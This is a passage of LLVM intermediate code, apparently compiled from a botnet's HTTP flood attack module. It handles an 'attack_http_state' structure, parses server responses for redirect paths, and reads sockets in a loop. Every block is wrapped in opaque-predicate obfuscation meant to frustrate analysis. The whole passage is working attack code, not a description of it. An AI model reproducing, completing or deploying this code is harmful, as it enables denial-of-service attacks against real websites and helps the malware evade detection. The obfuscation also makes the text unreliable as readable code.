  %3009 = load i32, i32* %58, align 4
  %3010 = icmp slt i32 %3009, 10
  %3011 = load i32, i32* @x.17
  %3012 = load i32, i32* @y.18
  %3013 = sub i32 %3011, 1
  %3014 = mul i32 %3011, %3013
  %3015 = urem i32 %3014, 2
  %3016 = icmp eq i32 %3015, 0
  %3017 = icmp slt i32 %3012, 10
  %3018 = or i1 %3016, %3017
  br i1 %3018, label %originalBBpart2467, label %originalBB465alteredBB

originalBBpart2467:                               ; preds = %originalBB465
  br i1 %3010, label %3019, label %3026

; <label>:3019:                                   ; preds = %originalBBpart2467
  %3020 = load i32, i32* %27, align 4
  %3021 = load i32, i32* %58, align 4
  %3022 = add i32 %3020, %3021
  %3023 = zext i32 %3022 to i64
  %3024 = call i64 @time(i64* null) #6
  %3025 = icmp sgt i64 %3023, %3024
  br label %3026

; <label>:3026:                                   ; preds = %3019, %originalBBpart2467, %2997
  %3027 = phi i1 [ false, %originalBBpart2467 ], [ false, %2997 ], [ %3025, %3019 ]
  br i1 %3027, label %3028, label %3030

; <label>:3028:                                   ; preds = %3026
  %3029 = call i32 @sleep(i32 1)
  br label %2997

; <label>:3030:                                   ; preds = %3026
  %3031 = load i32, i32* @x.17
  %3032 = load i32, i32* @y.18
  %3033 = sub i32 %3031, 1
  %3034 = mul i32 %3031, %3033
  %3035 = urem i32 %3034, 2
  %3036 = icmp eq i32 %3035, 0
  %3037 = icmp slt i32 %3032, 10
  %3038 = or i1 %3036, %3037
  br i1 %3038, label %originalBB469, label %originalBB469alteredBB

originalBB469:                                    ; preds = %originalBB469alteredBB, %3030
  %3039 = load i8*, i8** %57, align 8
  %3040 = load i32, i32* %10, align 4
  %3041 = sext i32 %3040 to i64
  %3042 = getelementptr inbounds i8, i8* %3039, i64 %3041
  store i8* %3042, i8** %57, align 8
  %3043 = load i8*, i8** %57, align 8
  %3044 = load i8*, i8** %57, align 8
  %3045 = call i32 @util_strlen(i8* %3044)
  %3046 = call i32 @util_stristr(i8* %3043, i32 %3045, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %3047 = icmp eq i32 %3046, 4
  %3048 = load i32, i32* @x.17
  %3049 = load i32, i32* @y.18
  %3050 = sub i32 %3048, 1
  %3051 = mul i32 %3048, %3050
  %3052 = urem i32 %3051, 2
  %3053 = icmp eq i32 %3052, 0
  %3054 = icmp slt i32 %3049, 10
  %3055 = or i1 %3053, %3054
  br i1 %3055, label %originalBBpart2471, label %originalBB469alteredBB

originalBBpart2471:                               ; preds = %originalBB469
  br i1 %3047, label %3056, label %3258

; <label>:3056:                                   ; preds = %originalBBpart2471
  store i32 7, i32* %10, align 4
  %3057 = load i8*, i8** %57, align 8
  %3058 = getelementptr inbounds i8, i8* %3057, i64 4
  %3059 = load i8, i8* %3058, align 1
  %3060 = sext i8 %3059 to i32
  %3061 = icmp eq i32 %3060, 115
  br i1 %3061, label %3062, label %3081

; <label>:3062:                                   ; preds = %3056
  %3063 = load i32, i32* @x.17
  %3064 = load i32, i32* @y.18
  %3065 = sub i32 %3063, 1
  %3066 = mul i32 %3063, %3065
  %3067 = urem i32 %3066, 2
  %3068 = icmp eq i32 %3067, 0
  %3069 = icmp slt i32 %3064, 10
  %3070 = or i1 %3068, %3069
  br i1 %3070, label %originalBB473, label %originalBB473alteredBB

originalBB473:                                    ; preds = %originalBB473alteredBB, %3062
  %3071 = load i32, i32* %10, align 4
  %3072 = add nsw i32 %3071, 1
  store i32 %3072, i32* %10, align 4
  %3073 = load i32, i32* @x.17
  %3074 = load i32, i32* @y.18
  %3075 = sub i32 %3073, 1
  %3076 = mul i32 %3073, %3075
  %3077 = urem i32 %3076, 2
  %3078 = icmp eq i32 %3077, 0
  %3079 = icmp slt i32 %3074, 10
  %3080 = or i1 %3078, %3079
  br i1 %3080, label %originalBBpart2482, label %originalBB473alteredBB

originalBBpart2482:                               ; preds = %originalBB473
  br label %3081

; <label>:3081:                                   ; preds = %originalBBpart2482, %3056
  %3082 = load i8*, i8** %57, align 8
  %3083 = load i8*, i8** %57, align 8
  %3084 = load i32, i32* %10, align 4
  %3085 = sext i32 %3084 to i64
  %3086 = getelementptr inbounds i8, i8* %3083, i64 %3085
  %3087 = load i32, i32* %56, align 4
  %3088 = load i32, i32* %10, align 4
  %3089 = sub nsw i32 %3087, %3088
  %3090 = sext i32 %3089 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3082, i8* %3086, i64 %3090, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %3091

; <label>:3091:                                   ; preds = %originalBBpart2492, %3081
  %3092 = load i8*, i8** %57, align 8
  %3093 = load i32, i32* %10, align 4
  %3094 = sext i32 %3093 to i64
  %3095 = getelementptr inbounds i8, i8* %3092, i64 %3094
  %3096 = load i8, i8* %3095, align 1
  %3097 = sext i8 %3096 to i32
  %3098 = icmp ne i32 %3097, 0
  br i1 %3098, label %3099, label %3131

; <label>:3099:                                   ; preds = %3091
  %3100 = load i8*, i8** %57, align 8
  %3101 = load i32, i32* %10, align 4
  %3102 = sext i32 %3101 to i64
  %3103 = getelementptr inbounds i8, i8* %3100, i64 %3102
  %3104 = load i8, i8* %3103, align 1
  %3105 = sext i8 %3104 to i32
  %3106 = icmp eq i32 %3105, 47
  br i1 %3106, label %3107, label %3112

; <label>:3107:                                   ; preds = %3099
  %3108 = load i8*, i8** %57, align 8
  %3109 = load i32, i32* %10, align 4
  %3110 = sext i32 %3109 to i64
  %3111 = getelementptr inbounds i8, i8* %3108, i64 %3110
  store i8 0, i8* %3111, align 1
  br label %3131

; <label>:3112:                                   ; preds = %3099
  %3113 = load i32, i32* @x.17
  %3114 = load i32, i32* @y.18
  %3115 = sub i32 %3113, 1
  %3116 = mul i32 %3113, %3115
  %3117 = urem i32 %3116, 2
  %3118 = icmp eq i32 %3117, 0
  %3119 = icmp slt i32 %3114, 10
  %3120 = or i1 %3118, %3119
  br i1 %3120, label %originalBB484, label %originalBB484alteredBB

originalBB484:                                    ; preds = %originalBB484alteredBB, %3112
  %3121 = load i32, i32* %10, align 4
  %3122 = add nsw i32 %3121, 1
  store i32 %3122, i32* %10, align 4
  %3123 = load i32, i32* @x.17
  %3124 = load i32, i32* @y.18
  %3125 = sub i32 %3123, 1
  %3126 = mul i32 %3123, %3125
  %3127 = urem i32 %3126, 2
  %3128 = icmp eq i32 %3127, 0
  %3129 = icmp slt i32 %3124, 10
  %3130 = or i1 %3128, %3129
  br i1 %3130, label %originalBBpart2492, label %originalBB484alteredBB

originalBBpart2492:                               ; preds = %originalBB484
  br label %3091

; <label>:3131:                                   ; preds = %3107, %3091
  %3132 = load i8*, i8** %57, align 8
  %3133 = call i32 @util_strlen(i8* %3132)
  %3134 = icmp sgt i32 %3133, 0
  br i1 %3134, label %3135, label %3161

; <label>:3135:                                   ; preds = %3131
  %3136 = load i32, i32* @x.17
  %3137 = load i32, i32* @y.18
  %3138 = sub i32 %3136, 1
  %3139 = mul i32 %3136, %3138
  %3140 = urem i32 %3139, 2
  %3141 = icmp eq i32 %3140, 0
  %3142 = icmp slt i32 %3137, 10
  %3143 = or i1 %3141, %3142
  br i1 %3143, label %originalBB494, label %originalBB494alteredBB

originalBB494:                                    ; preds = %originalBB494alteredBB, %3135
  %3144 = load i8*, i8** %57, align 8
  %3145 = call i32 @util_strlen(i8* %3144)
  %3146 = icmp slt i32 %3145, 128
  %3147 = load i32, i32* @x.17
  %3148 = load i32, i32* @y.18
  %3149 = sub i32 %3147, 1
  %3150 = mul i32 %3147, %3149
  %3151 = urem i32 %3150, 2
  %3152 = icmp eq i32 %3151, 0
  %3153 = icmp slt i32 %3148, 10
  %3154 = or i1 %3152, %3153
  br i1 %3154, label %originalBBpart2496, label %originalBB494alteredBB

originalBBpart2496:                               ; preds = %originalBB494
  br i1 %3146, label %3155, label %3161

; <label>:3155:                                   ; preds = %originalBBpart2496
  %3156 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3156, i32 0, i32 7
  %3158 = getelementptr inbounds [129 x i8], [129 x i8]* %3157, i32 0, i32 0
  %3159 = load i8*, i8** %57, align 8
  %3160 = call i32 @util_strcpy(i8* %3158, i8* %3159)
  br label %3161

; <label>:3161:                                   ; preds = %3155, %originalBBpart2496, %3131
  %3162 = load i32, i32* @x.17
  %3163 = load i32, i32* @y.18
  %3164 = sub i32 %3162, 1
  %3165 = mul i32 %3162, %3164
  %3166 = urem i32 %3165, 2
  %3167 = icmp eq i32 %3166, 0
  %3168 = icmp slt i32 %3163, 10
  %3169 = or i1 %3167, %3168
  br i1 %3169, label %originalBB498, label %originalBB498alteredBB

originalBB498:                                    ; preds = %originalBB498alteredBB, %3161
  %3170 = load i8*, i8** %57, align 8
  %3171 = load i32, i32* %10, align 4
  %3172 = add nsw i32 %3171, 1
  %3173 = sext i32 %3172 to i64
  %3174 = getelementptr inbounds i8, i8* %3170, i64 %3173
  %3175 = call i32 @util_strlen(i8* %3174)
  %3176 = icmp slt i32 %3175, 256
  %3177 = load i32, i32* @x.17
  %3178 = load i32, i32* @y.18
  %3179 = sub i32 %3177, 1
  %3180 = mul i32 %3177, %3179
  %3181 = urem i32 %3180, 2
  %3182 = icmp eq i32 %3181, 0
  %3183 = icmp slt i32 %3178, 10
  %3184 = or i1 %3182, %3183
  br i1 %3184, label %originalBBpart2505, label %originalBB498alteredBB

originalBBpart2505:                               ; preds = %originalBB498
  br i1 %3176, label %3185, label %3257

; <label>:3185:                                   ; preds = %originalBBpart2505
  %3186 = load i32, i32* @x.17
  %3187 = load i32, i32* @y.18
  %3188 = sub i32 %3186, 1
  %3189 = mul i32 %3186, %3188
  %3190 = urem i32 %3189, 2
  %3191 = icmp eq i32 %3190, 0
  %3192 = icmp slt i32 %3187, 10
  %3193 = or i1 %3191, %3192
  br i1 %3193, label %originalBB507, label %originalBB507alteredBB

originalBB507:                                    ; preds = %originalBB507alteredBB, %3185
  %3194 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3194, i32 0, i32 6
  %3196 = getelementptr inbounds [257 x i8], [257 x i8]* %3195, i32 0, i32 0
  %3197 = getelementptr inbounds i8, i8* %3196, i64 1
  call void @util_zero(i8* %3197, i32 255)
  %3198 = load i8*, i8** %57, align 8
  %3199 = load i32, i32* %10, align 4
  %3200 = add nsw i32 %3199, 1
  %3201 = sext i32 %3200 to i64
  %3202 = getelementptr inbounds i8, i8* %3198, i64 %3201
  %3203 = call i32 @util_strlen(i8* %3202)
  %3204 = icmp sgt i32 %3203, 0
  %3205 = load i32, i32* @x.17
  %3206 = load i32, i32* @y.18
  %3207 = sub i32 %3205, 1
  %3208 = mul i32 %3205, %3207
  %3209 = urem i32 %3208, 2
  %3210 = icmp eq i32 %3209, 0
  %3211 = icmp slt i32 %3206, 10
  %3212 = or i1 %3210, %3211
  br i1 %3212, label %originalBBpart2516, label %originalBB507alteredBB

originalBBpart2516:                               ; preds = %originalBB507
  br i1 %3204, label %3213, label %3240

; <label>:3213:                                   ; preds = %originalBBpart2516
  %3214 = load i32, i32* @x.17
  %3215 = load i32, i32* @y.18
  %3216 = sub i32 %3214, 1
  %3217 = mul i32 %3214, %3216
  %3218 = urem i32 %3217, 2
  %3219 = icmp eq i32 %3218, 0
  %3220 = icmp slt i32 %3215, 10
  %3221 = or i1 %3219, %3220
  br i1 %3221, label %originalBB518, label %originalBB518alteredBB

originalBB518:                                    ; preds = %originalBB518alteredBB, %3213
  %3222 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3223 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3222, i32 0, i32 6
  %3224 = getelementptr inbounds [257 x i8], [257 x i8]* %3223, i32 0, i32 0
  %3225 = getelementptr inbounds i8, i8* %3224, i64 1
  %3226 = load i8*, i8** %57, align 8
  %3227 = load i32, i32* %10, align 4
  %3228 = add nsw i32 %3227, 1
  %3229 = sext i32 %3228 to i64
  %3230 = getelementptr inbounds i8, i8* %3226, i64 %3229
  %3231 = call i32 @util_strcpy(i8* %3225, i8* %3230)
  %3232 = load i32, i32* @x.17
  %3233 = load i32, i32* @y.18
  %3234 = sub i32 %3232, 1
  %3235 = mul i32 %3232, %3234
  %3236 = urem i32 %3235, 2
  %3237 = icmp eq i32 %3236, 0
  %3238 = icmp slt i32 %3233, 10
  %3239 = or i1 %3237, %3238
  br i1 %3239, label %originalBBpart2524, label %originalBB518alteredBB

originalBBpart2524:                               ; preds = %originalBB518
  br label %3240

; <label>:3240:                                   ; preds = %originalBBpart2524, %originalBBpart2516
  %3241 = load i32, i32* @x.17
  %3242 = load i32, i32* @y.18
  %3243 = sub i32 %3241, 1
  %3244 = mul i32 %3241, %3243
  %3245 = urem i32 %3244, 2
  %3246 = icmp eq i32 %3245, 0
  %3247 = icmp slt i32 %3242, 10
  %3248 = or i1 %3246, %3247
  br i1 %3248, label %originalBB526, label %originalBB526alteredBB

originalBB526:                                    ; preds = %originalBB526alteredBB, %3240
  %3249 = load i32, i32* @x.17
  %3250 = load i32, i32* @y.18
  %3251 = sub i32 %3249, 1
  %3252 = mul i32 %3249, %3251
  %3253 = urem i32 %3252, 2
  %3254 = icmp eq i32 %3253, 0
  %3255 = icmp slt i32 %3250, 10
  %3256 = or i1 %3254, %3255
  br i1 %3256, label %originalBBpart2528, label %originalBB526alteredBB

originalBBpart2528:                               ; preds = %originalBB526
  br label %3257

; <label>:3257:                                   ; preds = %originalBBpart2528, %originalBBpart2505
  br label %3330

; <label>:3258:                                   ; preds = %originalBBpart2471
  %3259 = load i8*, i8** %57, align 8
  %3260 = getelementptr inbounds i8, i8* %3259, i64 0
  %3261 = load i8, i8* %3260, align 1
  %3262 = sext i8 %3261 to i32
  %3263 = icmp eq i32 %3262, 47
  br i1 %3263, label %3264, label %3329

; <label>:3264:                                   ; preds = %3258
  %3265 = load i32, i32* @x.17
  %3266 = load i32, i32* @y.18
  %3267 = sub i32 %3265, 1
  %3268 = mul i32 %3265, %3267
  %3269 = urem i32 %3268, 2
  %3270 = icmp eq i32 %3269, 0
  %3271 = icmp slt i32 %3266, 10
  %3272 = or i1 %3270, %3271
  br i1 %3272, label %originalBB530, label %originalBB530alteredBB

originalBB530:                                    ; preds = %originalBB530alteredBB, %3264
  %3273 = load i8*, i8** %57, align 8
  %3274 = load i32, i32* %10, align 4
  %3275 = add nsw i32 %3274, 1
  %3276 = sext i32 %3275 to i64
  %3277 = getelementptr inbounds i8, i8* %3273, i64 %3276
  %3278 = call i32 @util_strlen(i8* %3277)
  %3279 = icmp slt i32 %3278, 256
  %3280 = load i32, i32* @x.17
  %3281 = load i32, i32* @y.18
  %3282 = sub i32 %3280, 1
  %3283 = mul i32 %3280, %3282
  %3284 = urem i32 %3283, 2
  %3285 = icmp eq i32 %3284, 0
  %3286 = icmp slt i32 %3281, 10
  %3287 = or i1 %3285, %3286
  br i1 %3287, label %originalBBpart2547, label %originalBB530alteredBB

originalBBpart2547:                               ; preds = %originalBB530
  br i1 %3279, label %3288, label %3328

; <label>:3288:                                   ; preds = %originalBBpart2547
  %3289 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3290 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3289, i32 0, i32 6
  %3291 = getelementptr inbounds [257 x i8], [257 x i8]* %3290, i32 0, i32 0
  %3292 = getelementptr inbounds i8, i8* %3291, i64 1
  call void @util_zero(i8* %3292, i32 255)
  %3293 = load i8*, i8** %57, align 8
  %3294 = load i32, i32* %10, align 4
  %3295 = add nsw i32 %3294, 1
  %3296 = sext i32 %3295 to i64
  %3297 = getelementptr inbounds i8, i8* %3293, i64 %3296
  %3298 = call i32 @util_strlen(i8* %3297)
  %3299 = icmp sgt i32 %3298, 0
  br i1 %3299, label %3300, label %3327

; <label>:3300:                                   ; preds = %3288
  %3301 = load i32, i32* @x.17
  %3302 = load i32, i32* @y.18
  %3303 = sub i32 %3301, 1
  %3304 = mul i32 %3301, %3303
  %3305 = urem i32 %3304, 2
  %3306 = icmp eq i32 %3305, 0
  %3307 = icmp slt i32 %3302, 10
  %3308 = or i1 %3306, %3307
  br i1 %3308, label %originalBB549, label %originalBB549alteredBB

originalBB549:                                    ; preds = %originalBB549alteredBB, %3300
  %3309 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3310 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3309, i32 0, i32 6
  %3311 = getelementptr inbounds [257 x i8], [257 x i8]* %3310, i32 0, i32 0
  %3312 = getelementptr inbounds i8, i8* %3311, i64 1
  %3313 = load i8*, i8** %57, align 8
  %3314 = load i32, i32* %10, align 4
  %3315 = add nsw i32 %3314, 1
  %3316 = sext i32 %3315 to i64
  %3317 = getelementptr inbounds i8, i8* %3313, i64 %3316
  %3318 = call i32 @util_strcpy(i8* %3312, i8* %3317)
  %3319 = load i32, i32* @x.17
  %3320 = load i32, i32* @y.18
  %3321 = sub i32 %3319, 1
  %3322 = mul i32 %3319, %3321
  %3323 = urem i32 %3322, 2
  %3324 = icmp eq i32 %3323, 0
  %3325 = icmp slt i32 %3320, 10
  %3326 = or i1 %3324, %3325
  br i1 %3326, label %originalBBpart2557, label %originalBB549alteredBB

originalBBpart2557:                               ; preds = %originalBB549
  br label %3327

; <label>:3327:                                   ; preds = %originalBBpart2557, %3288
  br label %3328

; <label>:3328:                                   ; preds = %3327, %originalBBpart2547
  br label %3329

; <label>:3329:                                   ; preds = %3328, %3258
  br label %3330

; <label>:3330:                                   ; preds = %3329, %3257
  %3331 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3331, i32 0, i32 9
  %3333 = getelementptr inbounds [9 x i8], [9 x i8]* %3332, i32 0, i32 0
  %3334 = call i8* @strcpy(i8* %3333, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %3335 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3336 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3335, i32 0, i32 1
  store i8 10, i8* %3336, align 4
  br label %4233

; <label>:3337:                                   ; preds = %originalBBpart2428
  %3338 = load i32, i32* @x.17
  %3339 = load i32, i32* @y.18
  %3340 = sub i32 %3338, 1
  %3341 = mul i32 %3338, %3340
  %3342 = urem i32 %3341, 2
  %3343 = icmp eq i32 %3342, 0
  %3344 = icmp slt i32 %3339, 10
  %3345 = or i1 %3343, %3344
  br i1 %3345, label %originalBB559, label %originalBB559alteredBB

originalBB559:                                    ; preds = %originalBB559alteredBB, %3337
  %3346 = load i32, i32* @x.17
  %3347 = load i32, i32* @y.18
  %3348 = sub i32 %3346, 1
  %3349 = mul i32 %3346, %3348
  %3350 = urem i32 %3349, 2
  %3351 = icmp eq i32 %3350, 0
  %3352 = icmp slt i32 %3347, 10
  %3353 = or i1 %3351, %3352
  br i1 %3353, label %originalBBpart2561, label %originalBB559alteredBB

originalBBpart2561:                               ; preds = %originalBB559
  br label %3354

; <label>:3354:                                   ; preds = %originalBBpart2561, %2735
  br label %3355

; <label>:3355:                                   ; preds = %3354, %originalBBpart2390
  %3356 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %3357 = load i32, i32* %12, align 4
  %3358 = call i32 @util_memsearch(i8* %3356, i32 %3357, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %3358, i32* %37, align 4
  %3359 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3359, i32 0, i32 9
  %3361 = getelementptr inbounds [9 x i8], [9 x i8]* %3360, i32 0, i32 0
  %3362 = call signext i8 @util_strcmp(i8* %3361, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %3363 = sext i8 %3362 to i32
  %3364 = icmp ne i32 %3363, 0
  br i1 %3364, label %3372, label %3365

; <label>:3365:                                   ; preds = %3355
  %3366 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3366, i32 0, i32 9
  %3368 = getelementptr inbounds [9 x i8], [9 x i8]* %3367, i32 0, i32 0
  %3369 = call signext i8 @util_strcmp(i8* %3368, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %3370 = sext i8 %3369 to i32
  %3371 = icmp ne i32 %3370, 0
  br i1 %3371, label %3372, label %3375

; <label>:3372:                                   ; preds = %3365, %3355
  %3373 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3374 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3373, i32 0, i32 1
  store i8 7, i8* %3374, align 4
  br label %3402

; <label>:3375:                                   ; preds = %3365
  %3376 = load i32, i32* @x.17
  %3377 = load i32, i32* @y.18
  %3378 = sub i32 %3376, 1
  %3379 = mul i32 %3376, %3378
  %3380 = urem i32 %3379, 2
  %3381 = icmp eq i32 %3380, 0
  %3382 = icmp slt i32 %3377, 10
  %3383 = or i1 %3381, %3382
  br i1 %3383, label %originalBB563, label %originalBB563alteredBB

originalBB563:                                    ; preds = %originalBB563alteredBB, %3375
  %3384 = load i32, i32* %12, align 4
  %3385 = load i32, i32* %37, align 4
  %3386 = icmp sgt i32 %3384, %3385
  %3387 = load i32, i32* @x.17
  %3388 = load i32, i32* @y.18
  %3389 = sub i32 %3387, 1
  %3390 = mul i32 %3387, %3389
  %3391 = urem i32 %3390, 2
  %3392 = icmp eq i32 %3391, 0
  %3393 = icmp slt i32 %3388, 10
  %3394 = or i1 %3392, %3393
  br i1 %3394, label %originalBBpart2565, label %originalBB563alteredBB

originalBBpart2565:                               ; preds = %originalBB563
  br i1 %3386, label %3395, label %3398

; <label>:3395:                                   ; preds = %originalBBpart2565
  %3396 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3396, i32 0, i32 1
  store i8 10, i8* %3397, align 4
  br label %3401

; <label>:3398:                                   ; preds = %originalBBpart2565
  %3399 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3399, i32 0, i32 1
  store i8 1, i8* %3400, align 4
  br label %3401

; <label>:3401:                                   ; preds = %3398, %3395
  br label %3402

; <label>:3402:                                   ; preds = %3401, %3372
  %3403 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3403, i32 0, i32 0
  %3405 = load i32, i32* %3404, align 4
  %3406 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %3407 = load i32, i32* %37, align 4
  %3408 = sext i32 %3407 to i64
  %3409 = call i64 @recv(i32 %3405, i8* %3406, i64 %3408, i32 16384)
  %3410 = trunc i64 %3409 to i32
  store i32 %3410, i32* %12, align 4
  br label %4215

; <label>:3411:                                   ; preds = %1626
  %3412 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3412, i32 0, i32 1
  %3414 = load i8, i8* %3413, align 4
  %3415 = zext i8 %3414 to i32
  %3416 = icmp eq i32 %3415, 7
  br i1 %3416, label %3417, label %4034

; <label>:3417:                                   ; preds = %3411
  br label %3418

; <label>:3418:                                   ; preds = %4032, %3417
  %3419 = load i32, i32* @x.17
  %3420 = load i32, i32* @y.18
  %3421 = sub i32 %3419, 1
  %3422 = mul i32 %3419, %3421
  %3423 = urem i32 %3422, 2
  %3424 = icmp eq i32 %3423, 0
  %3425 = icmp slt i32 %3420, 10
  %3426 = or i1 %3424, %3425
  br i1 %3426, label %originalBB567, label %originalBB567alteredBB

originalBB567:                                    ; preds = %originalBB567alteredBB, %3418
  %3427 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3428 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3427, i32 0, i32 1
  %3429 = load i8, i8* %3428, align 4
  %3430 = zext i8 %3429 to i32
  %3431 = icmp ne i32 %3430, 7
  %3432 = load i32, i32* @x.17
  %3433 = load i32, i32* @y.18
  %3434 = sub i32 %3432, 1
  %3435 = mul i32 %3432, %3434
  %3436 = urem i32 %3435, 2
  %3437 = icmp eq i32 %3436, 0
  %3438 = icmp slt i32 %3433, 10
  %3439 = or i1 %3437, %3438
  br i1 %3439, label %originalBBpart2569, label %originalBB567alteredBB

originalBBpart2569:                               ; preds = %originalBB567
  br i1 %3431, label %3440, label %3441

; <label>:3440:                                   ; preds = %originalBBpart2569
  br label %4033

; <label>:3441:                                   ; preds = %originalBBpart2569
  %3442 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3442, i32 0, i32 17
  %3444 = load i32, i32* %3443, align 4
  %3445 = icmp eq i32 %3444, 1024
  br i1 %3445, label %3446, label %3474

; <label>:3446:                                   ; preds = %3441
  %3447 = load i32, i32* @x.17
  %3448 = load i32, i32* @y.18
  %3449 = sub i32 %3447, 1
  %3450 = mul i32 %3447, %3449
  %3451 = urem i32 %3450, 2
  %3452 = icmp eq i32 %3451, 0
  %3453 = icmp slt i32 %3448, 10
  %3454 = or i1 %3452, %3453
  br i1 %3454, label %originalBB571, label %originalBB571alteredBB

originalBB571:                                    ; preds = %originalBB571alteredBB, %3446
  %3455 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3456 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3455, i32 0, i32 18
  %3457 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3456, i32 0, i32 0
  %3458 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3458, i32 0, i32 18
  %3460 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3459, i32 0, i32 0
  %3461 = getelementptr inbounds i8, i8* %3460, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3457, i8* %3461, i64 960, i32 1, i1 false)
  %3462 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3462, i32 0, i32 17
  %3464 = load i32, i32* %3463, align 4
  %3465 = sub nsw i32 %3464, 64
  store i32 %3465, i32* %3463, align 4
  %3466 = load i32, i32* @x.17
  %3467 = load i32, i32* @y.18
  %3468 = sub i32 %3466, 1
  %3469 = mul i32 %3466, %3468
  %3470 = urem i32 %3469, 2
  %3471 = icmp eq i32 %3470, 0
  %3472 = icmp slt i32 %3467, 10
  %3473 = or i1 %3471, %3472
  br i1 %3473, label %originalBBpart2578, label %originalBB571alteredBB

originalBBpart2578:                               ; preds = %originalBB571
  br label %3474

; <label>:3474:                                   ; preds = %originalBBpart2578, %3441
  %3475 = call i32* @__errno_location() #7
  store i32 0, i32* %3475, align 4
  %3476 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3477 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3476, i32 0, i32 0
  %3478 = load i32, i32* %3477, align 4
  %3479 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3480 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3479, i32 0, i32 18
  %3481 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3480, i32 0, i32 0
  %3482 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3483 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3482, i32 0, i32 17
  %3484 = load i32, i32* %3483, align 4
  %3485 = sext i32 %3484 to i64
  %3486 = getelementptr inbounds i8, i8* %3481, i64 %3485
  %3487 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3488 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3487, i32 0, i32 17
  %3489 = load i32, i32* %3488, align 4
  %3490 = sub nsw i32 1024, %3489
  %3491 = sext i32 %3490 to i64
  %3492 = call i64 @recv(i32 %3478, i8* %3486, i64 %3491, i32 16384)
  %3493 = trunc i64 %3492 to i32
  store i32 %3493, i32* %12, align 4
  %3494 = load i32, i32* %12, align 4
  %3495 = icmp eq i32 %3494, 0
  br i1 %3495, label %3496, label %3498

; <label>:3496:                                   ; preds = %3474
  %3497 = call i32* @__errno_location() #7
  store i32 104, i32* %3497, align 4
  store i32 -1, i32* %12, align 4
  br label %3498

; <label>:3498:                                   ; preds = %3496, %3474
  %3499 = load i32, i32* %12, align 4
  %3500 = icmp eq i32 %3499, -1
  br i1 %3500, label %3501, label %3551

; <label>:3501:                                   ; preds = %3498
  %3502 = call i32* @__errno_location() #7
  %3503 = load i32, i32* %3502, align 4
  %3504 = icmp ne i32 %3503, 11
  br i1 %3504, label %3505, label %3534

; <label>:3505:                                   ; preds = %3501
  %3506 = load i32, i32* @x.17
  %3507 = load i32, i32* @y.18
  %3508 = sub i32 %3506, 1
  %3509 = mul i32 %3506, %3508
  %3510 = urem i32 %3509, 2
  %3511 = icmp eq i32 %3510, 0
  %3512 = icmp slt i32 %3507, 10
  %3513 = or i1 %3511, %3512
  br i1 %3513, label %originalBB580, label %originalBB580alteredBB

originalBB580:                                    ; preds = %originalBB580alteredBB, %3505
  %3514 = call i32* @__errno_location() #7
